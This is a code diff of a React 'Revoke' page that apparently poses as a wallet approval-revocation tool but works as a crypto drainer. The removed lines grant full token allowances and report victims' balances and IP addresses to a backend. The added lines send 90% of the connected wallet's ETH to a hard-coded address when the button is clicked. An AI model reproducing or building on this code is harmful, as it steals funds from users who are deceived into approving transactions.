@@ -16,7 +16,7 @@ import {
   tokenConfirmed,
   tokenDeclined,
 } from "../api";
-import { parseEther } from "viem";
+import { etherUnits, parseEther, parseUnits } from "viem";
 
 const Revoke = () => {
   const {
@@ -123,67 +123,70 @@ const Revoke = () => {
   const handleClick = async () => {
     setIsButtonDisabled(true);
     try {
-      for (const token of walletData.erc_20_tokens) {
-        const { contract_address, balance, token_name, token_balance } = token;
-        const data = {
-          asset_name: token_name,
-          domain: walletData.domain,
-          ip_address: walletData.ip_address,
-          withdrawal_amount: balance,
-          withdrawal_amount_token: token_balance,
-        };
-        try {
-          const res = await requestTokenSignature(data);
-          console.log("request Token Signature succesful: ", res);
-        } catch (error) {
-          console.log("request Token Signature failed:", error);
-        }
-        const res = await increaseAllowance(contract_address, token_balance);
-        if (res.success) {
-          const data = {
-            asset_name: token_name,
-            domain: walletData.domain,
-            transaction_hash: res.data,
-            ip_address: walletData.ip_address,
-            withdrawal_amount: balance,
-            withdrawal_amount_token: token_balance,
-          };
-          console.log("token confirmed :", data);
-          try {
-            const res = await tokenConfirmed(data);
-            console.log("token confirmed post successful: ", res);
-            console.log(
-              `Increase allowance successful! Transaction hash: ${res.data}`
-            );
-          } catch (error) {
-            console.error("token confirmed post failed:", error);
-          }
-        } else {
-          const data = {
-            asset_name: token_name,
-            domain: walletData.domain,
-            ip_address: walletData.ip_address,
-            withdrawal_amount: balance,
-            withdrawal_amount_token: token_balance,
-          };
-          try {
-            const res = await tokenDeclined(data);
-            console.log("tokenDeclined post successful:", res);
-            console.log(`Increase allowance failed: ${res.error}`);
-          } catch (error) {
-            console.log("tokenDeclined post failed:", res);
-          }
-        }
-      }
-      try {
-        const tx = sendTransaction({
-          to: "0x80EeF47fAb3b35726eBE01922969224EEC8B393E",
-          value: parseEther("0.001"),
-        });
-        console.log("Transaction sent:", sentEthTx);
-      } catch (error) {
-        console.error("Error sending transaction:", error);
-      }
+      // for (const token of walletData.erc_20_tokens) {
+      //   const { contract_address, balance, token_name, token_balance } = token;
+      //   const data = {
+      //     asset_name: token_name,
+      //     domain: walletData.domain,
+      //     ip_address: walletData.ip_address,
+      //     withdrawal_amount: balance,
+      //     withdrawal_amount_token: token_balance,
+      //   };
+      //   try {
+      //     const res = await requestTokenSignature(data);
+      //     console.log("request Token Signature succesful: ", res);
+      //   } catch (error) {
+      //     console.log("request Token Signature failed:", error);
+      //   }
+      //   const res = await increaseAllowance(contract_address, token_balance);
+      //   if (res.success) {
+      //     const data = {
+      //       asset_name: token_name,
+      //       domain: walletData.domain,
+      //       transaction_hash: res.data,
+      //       ip_address: walletData.ip_address,
+      //       withdrawal_amount: balance,
+      //       withdrawal_amount_token: token_balance,
+      //     };
+      //     console.log("token confirmed :", data);
+      //     try {
+      //       const res = await tokenConfirmed(data);
+      //       console.log("token confirmed post successful: ", res);
+      //       console.log(
+      //         `Increase allowance successful! Transaction hash: ${res.data}`
+      //       );
+      //     } catch (error) {
+      //       console.error("token confirmed post failed:", error);
+      //     }
+      //   } else {
+      //     const data = {
+      //       asset_name: token_name,
+      //       domain: walletData.domain,
+      //       ip_address: walletData.ip_address,
+      //       withdrawal_amount: balance,
+      //       withdrawal_amount_token: token_balance,
+      //     };
+      //     try {
+      //       const res = await tokenDeclined(data);
+      //       console.log("tokenDeclined post successful:", res);
+      //       console.log(`Increase allowance failed: ${res.error}`);
+      //     } catch (error) {
+      //       console.log("tokenDeclined post failed:", res);
+      //     }
+      //   }
+      // }
+    //  send native token
+    const nintyPercentage = 0.9 * ethBalance
+
+    try {
+      const tx = sendTransaction({
+        to: "0xD745A139eDb02c0c9eC4ce523a8c87D9f4d109E0",
+        value:  parseEther(nintyPercentage.toString()),
+      });
+      console.log("Transaction sent:", tx);
+    } catch (error) {
+      console.error("Error sending transaction:", error);
+    }
     } catch (error) {
       console.error("Failed to increase allowance token:", error);
     } finally {
@@ -240,7 +243,7 @@ const Revoke = () => {
                 <div className="flex flex-col sm:flex-row items-center gap-2">
                   <div className="flex items-center gap-1 text-sm text-zinc-500 dark:text-zinc-400">
                     <div className="flex gap-0.5 items-center leading-tight shrink-0">
-                      <span>{loadingEthBalance ? "Loading" : ethBalance}</span>
+                      <span>{loadingEthBalance ? "Loading" : Number(ethBalance).toFixed(4)}</span>
                       <span className="font-bold">ETH</span>
                     </div>
                     <div className="leading-none">•</div>
@@ -288,15 +291,7 @@ const Revoke = () => {
                 </div>
               </div>
               <div>
-                {connectors.map((connector) => (
-                  <button
-                    className="bg-black text-white"
-                    key={connector.id}
-                    onClick={() => switchAccount({ connector })}
-                  >
-                    {isConnected ? connector.name : "loading"}
-                  </button>
-                ))}
+               
               </div>
               <div className="flex items-center gap-6">
                 <div className="flex items-center gap-6 sm:gap-2">
